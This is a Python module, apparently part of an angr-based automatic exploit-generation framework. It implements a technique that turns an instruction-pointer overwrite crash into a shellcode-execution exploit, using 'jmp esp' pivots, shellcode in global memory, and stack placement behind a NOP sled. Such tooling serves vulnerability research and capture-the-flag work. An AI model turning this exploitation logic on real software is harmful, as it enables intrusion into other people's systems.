import logging
from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.call_shellcode")

class CallShellcode(Technique):

    name = "call_shellcode"

    applicable_to = ['unix']

    def apply(self, use_nopsled=True, **kwargs):

        # When ASLR is disabled, there might be a difference between the stack pointer we see in angr and the stack
        # pointer in the target process. Here we calculate the difference between our SP and the real one in coredump.
        sp_difference = 0
        if not self.crash.aslr and \
                not self.crash.state.regs.sp.symbolic and \
                self.crash.core_registers:
            if 'esp' in self.crash.core_registers:
                sp_difference = self.crash.core_registers['esp'] - \
                                self.crash.state.solver.eval(self.crash.state.regs.sp)
                l.debug("The difference between stack pointers is %#x bytes.", sp_difference)

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("[%s] cannot control ip" % self.name)

        if not self.crash.project.loader.main_object.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)

        # try to write shellcode into global memory
        shellcode = self.shellcode.get_default(**kwargs)

        # try to use a "jmp esp/call esp"
        # 1) find all pivots
        # 2) try each of the pivots with the constraint that the data below the stack is our shellcode
        # 3) done
        if not self.crash.project.loader.main_object.pic and not self.crash.state.regs.sp.symbolic:
            l.debug("try: jmp esp")
            ld = self.crash.project.loader
            pivots = [x + ld.main_object.mapped_base for x in ld.main_object.memory.find(b'\xff\xe4')]
            pivots += [x + ld.main_object.mapped_base for x in ld.main_object.memory.find(b'\xff\xd4')]
            code_constraint = self.crash.state.memory.load(self.crash.state.regs.sp, len(shellcode)) == shellcode

            for pivot in pivots:
                exp = self._attempt_jump([code_constraint], pivot)
                if exp is not None:
                    return exp

        # try to write to some known memory address
        # 1) find a w+x region we can write to
        # 2) see if we can constrain its value to shellcode and the ip to that address
        # 3) done
        l.debug('try: shellcode in global data')
        shc_addr, shc_constraint = self._write_global_data(shellcode)
        if shc_addr is not None:
            exp = self._attempt_jump([shc_constraint], shc_addr)
            if exp is not None:
                return exp

        # try to see if we can jump directly to the stack
        # 1) check that aslr is disabled
        # 2) find all the regions on the stack that are touched by stdin
        # 3) find the largest of those regions that are not concretely constrained
        # 4) check that we can jump to the middle of a nopsled in one of them
        # 5) done
        if not self.crash.aslr:
            l.debug('try: absolute address in stack')
            base_stack_addrs = self.crash.stack_control()
            stack_addrs = {}
            for addr, size in base_stack_addrs.items():
                root = None
                for subaddr in range(addr, addr+size):
                    val = self.crash.state.memory.load(subaddr, 1)
                    # TODO: This sucks. do a real approximation with something like DVSA.
                    if any('aeg_stdin' in name for name in val.variables) and not \
                            any(c.op == '__eq__' for c in self.crash.state.solver.constraints if not c.variables - val.variables):
                        if root is not None:
                            stack_addrs[root] += 1
                        else:
                            root = subaddr
                            stack_addrs[root] = 1
                    else:
                        root = None

            word_size = self.crash.state.arch.bits // self.crash.state.arch.byte_width
            for root in sorted(stack_addrs, key=lambda a: -stack_addrs[a]):
                if stack_addrs[root] < len(shellcode):
                    continue

                # Where do we want to write the shellcode to? Note that we are not always able to write the shellcode
                # from the very beginning of root. Some smart probing is necessary.
                # FIXME: I'm not smart enough to do a smart probing.
                for offset in range(0, stack_addrs[root] - len(shellcode), word_size):
                    sc_data = self.crash.state.memory.load(root + offset, len(shellcode))
                    sc_constraint = sc_data == shellcode
                    if self.crash.state.solver.satisfiable(extra_constraints=(sc_constraint,)):
                        break
                else:
                    l.debug("Cannot write shellcode in region %#x(%#x bytes). Probe the next region.",
                            root, stack_addrs[root]
                            )
                    continue
                l.debug("We may write shellcode on the stack at %#x.", root + offset)

                if use_nopsled:
                    nopsled_size = self._determine_nopsled_lenth(stack_addrs, root, offset, shellcode)
                else:
                    nopsled_size = 0

                # try the addresses in a spiral pattern
                addrs = list(range(nopsled_size + 1))
                cur = len(addrs) // 2
                for i in range(len(addrs)):
                    if i % 2 == 0:
                        cur += i
                    else:
                        cur -= i
                    addr = root + offset + addrs[cur]
                    adjusted_addr = addr + sp_difference
                    exp = self._attempt_jump([sc_constraint], adjusted_addr, bypasses_aslr=False)
                    if exp is not None:
                        return exp

        # try to read shellcode into memory into one of the aforementioned addresses
        l.debug("try: read shellcode into global data")
        try:
            shc_addr, shc_constraint = self._read_in_global_data(shellcode)
        except CannotExploit as e:
            raise CannotExploit("[%s] cannot call read (all other call-shellcodes failed)" % self.name) from e

        exp = self._attempt_jump([shc_constraint], shc_addr)
        if exp is not None:
            return exp

        raise CannotExploit("[%s] EVERYTHING FAILED" % self.name)

    def _determine_nopsled_lenth(self, stack_addrs, root, offset, shellcode):

        min_nopsled_size = 0
        max_nopsled_size = stack_addrs[root] - offset - len(shellcode)
        while min_nopsled_size < max_nopsled_size:
            attempt = (min_nopsled_size + max_nopsled_size + 1) // 2
            works, sc_constraint = self._attempt_write_nopsled(self.crash.state, shellcode, root + offset, attempt)
            if not works:
                # we are trying to write too many. Write less!
                max_nopsled_size = attempt - 1
            else:
                # try to write more?
                min_nopsled_size = attempt

        return min_nopsled_size

    def _attempt_jump(self, constraints, addr, bypasses_nx=False, bypasses_aslr=True):
        all_constraints = list(constraints) + [self.crash.state.regs.ip == addr]

        if self.crash.state.solver.satisfiable(extra_constraints=all_constraints):
            self.crash.state.solver.add(*all_constraints)
            return Exploit(self.crash, bypasses_aslr=bypasses_aslr, bypasses_nx=bypasses_nx)

        return None

    def _attempt_write_nopsled(self, state, shellcode, start, nopsled_size):
        sc_data = state.memory.load(start, len(shellcode) + nopsled_size)
        sc_constraint = sc_data == b'\x90' * nopsled_size + shellcode
        return state.solver.satisfiable(extra_constraints=(sc_constraint,)), sc_constraint
